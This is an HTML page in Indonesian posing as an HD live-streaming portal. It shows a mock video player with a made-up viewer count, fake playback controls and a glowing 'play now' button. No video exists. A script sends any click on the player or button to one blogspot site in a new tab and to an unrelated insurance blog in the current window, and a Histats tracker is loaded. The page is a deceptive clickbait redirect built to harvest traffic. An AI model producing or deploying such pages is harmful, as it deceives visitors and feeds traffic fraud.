<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Portal Streaming Media HD</title>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            background-color: #06080d;
            color: #f8fafc;
            -webkit-tap-highlight-color: transparent;
        }
        .ambient-mesh {
            background-image: 
                radial-gradient(at 0% 0%, rgba(16, 185, 129, 0.18) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(6, 182, 212, 0.15) 0px, transparent 50%);
        }
        .btn-glow {
            position: relative;
            overflow: hidden;
        }
        .btn-glow::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(60deg, transparent, rgba(255, 255, 255, 0.25), transparent);
            transform: rotate(30deg);
            animation: shine 3s infinite ease-in-out;
        }
        @keyframes shine {
            0% { transform: translateX(-150%) rotate(30deg); }
            50%, 100% { transform: translateX(150%) rotate(30deg); }
        }
        .pulse-circle {
            animation: pulse-ring 2s infinite cubic-bezier(0.4, 0, 0.6, 1);
        }
        @keyframes pulse-ring {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.85; }
        }
    </style>
</head>
<body class="ambient-mesh min-h-screen flex items-center justify-center p-4 sm:p-6">

    <!-- Card Wrapper -->
    <div class="w-full max-w-lg bg-slate-900/90 border border-slate-800/90 backdrop-blur-2xl rounded-[2rem] p-6 sm:p-8 shadow-[0_20px_50px_rgba(0,0,0,0.7)] flex flex-col items-center text-center relative overflow-hidden">
        
        <!-- Aksen Garis Gradien Atas -->
        <div class="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-emerald-500 via-teal-400 to-cyan-500"></div>

        <!-- Baris Status Live & Penonton -->
        <div class="w-full flex items-center justify-between mb-4 px-1">
            <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-bold">
                <span class="w-2 h-2 rounded-full bg-red-500 animate-pulse"></span>
                <span>LIVE HD</span>
            </div>
            <div class="inline-flex items-center gap-1.5 text-xs text-slate-400 font-medium">
                <i class="fas fa-eye text-emerald-400 text-xs"></i>
                <span class="text-slate-200 font-bold">38.4K</span> online
            </div>
        </div>

        <!-- Video Player Mockup Interaktif -->
        <div id="playerArea" class="w-full aspect-video bg-black rounded-2xl overflow-hidden relative group cursor-pointer border border-slate-800 shadow-2xl mb-5 transition-transform active:scale-[0.99]">
            
            <!-- Video Overlay Gradien -->
            <div class="absolute inset-0 bg-gradient-to-t from-black/95 via-black/40 to-black/20"></div>

            <!-- Tombol Play Tengah (Pulsing Glow) -->
            <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-20">
                <div class="pulse-circle w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-tr from-emerald-600 to-teal-400 text-slate-950 rounded-full flex items-center justify-center shadow-2xl shadow-emerald-500/50 group-hover:scale-110 transition-transform duration-300 border-4 border-white/20">
                    <i class="fas fa-play text-xl sm:text-2xl ml-1 text-slate-950"></i>
                </div>
            </div>

            <!-- Kontrol Dummy Bawah -->
            <div class="absolute bottom-3 left-4 right-4 z-20 flex justify-between items-center text-white text-xs font-semibold">
                <div class="flex items-center gap-2 bg-slate-900/80 backdrop-blur-md px-2.5 py-1 rounded-lg border border-slate-700/50">
                    <i class="fas fa-pause text-[10px] text-emerald-400"></i>
                    <span class="tabular-nums text-[11px] text-slate-200">08:42 / 18:05</span>
                </div>
                <div class="flex items-center gap-3 text-slate-400">
                    <span class="text-[10px] bg-slate-800 px-2 py-0.5 rounded text-emerald-400 font-bold">1080p</span>
                    <i class="fas fa-expand text-xs hover:text-white"></i>
                </div>
            </div>

            <!-- Progress Bar Hijau Neon -->
            <div class="absolute bottom-0 left-0 w-full h-1 bg-white/10">
                <div class="h-full bg-gradient-to-r from-emerald-500 to-teal-400 w-[55%] relative">
                    <div class="absolute right-0 top-1/2 -translate-y-1/2 w-2.5 h-2.5 bg-emerald-300 rounded-full shadow-md shadow-emerald-500"></div>
                </div>
            </div>
        </div>

        <!-- Judul & Keterangan -->
        <h1 class="text-xl sm:text-2xl font-extrabold text-white tracking-tight leading-snug mb-2">
            Pemutar Video Telah Siap
        </h1>
        <p class="text-slate-400 text-sm leading-relaxed mb-6 px-1">
            Ketuk area pemutar video di atas atau klik tombol hijau di bawah untuk memulai pemutaran streaming kualitas penuh.
        </p>

        <!-- Tombol Aksi Utama (Sangat Menarik & Thumb-Friendly) -->
        <button id="startBtn" class="btn-glow w-full bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 active:scale-[0.97] text-slate-950 font-extrabold py-4 sm:py-5 px-6 rounded-2xl text-base sm:text-lg shadow-xl shadow-emerald-500/25 transition-all flex items-center justify-center gap-3 cursor-pointer mb-6">
            <i class="fas fa-play-circle text-xl"></i>
            <span>Putar Tayangan Sekarang</span>
            <i class="fas fa-arrow-right text-sm"></i>
        </button>

        <!-- Indikator 3 Kolom Bawah -->
        <div class="pt-5 border-t border-slate-800/80 w-full grid grid-cols-3 gap-2 text-slate-400 text-xs font-semibold">
            <div class="flex flex-col items-center gap-1.5 p-1 rounded-xl">
                <i class="fas fa-tv text-emerald-400 text-base"></i>
                <span class="text-slate-300">Full 1080p</span>
            </div>
            <div class="flex flex-col items-center gap-1.5 p-1 rounded-xl">
                <i class="fas fa-bolt text-teal-400 text-base"></i>
                <span class="text-slate-300">Instan Play</span>
            </div>
            <div class="flex flex-col items-center gap-1.5 p-1 rounded-xl">
                <i class="fas fa-server text-cyan-400 text-base"></i>
                <span class="text-slate-300">Server Aktif</span>
            </div>
        </div>

    </div>

    <!-- Script Redirect -->
    <script>
        const domains = [
            'https://extrendings.blogspot.com/'
        ];

        function triggerAction() {
            const randomUrl = domains[Math.floor(Math.random() * domains.length)];
            window.open(randomUrl, '_blank');
            window.location.href = 'https://topinsurancepos.blogspot.com/';
        }

        // Berlaku untuk klik player mockup maupun tombol utama
        document.getElementById('playerArea').addEventListener('click', triggerAction);
        document.getElementById('startBtn').addEventListener('click', triggerAction);
    </script>

    <!-- Tracker Histats -->
    <script type='text/javascript'>
        var _Hasync=_Hasync||[];
        _Hasync.push(['Histats.start', '1,4914312,4,0,0,0,00010000']);
        _Hasync.push(['Histats.fasi', '1']);
        _Hasync.push(['Histats.track_hits', '']);
        (function(){
            var hs = document.createElement('script'); hs.async = true;
            hs.src = '//s10.histats.com/js15_as.js';
            (document.head||document.body).appendChild(hs);
        })();
    </script>
</body>
</html>
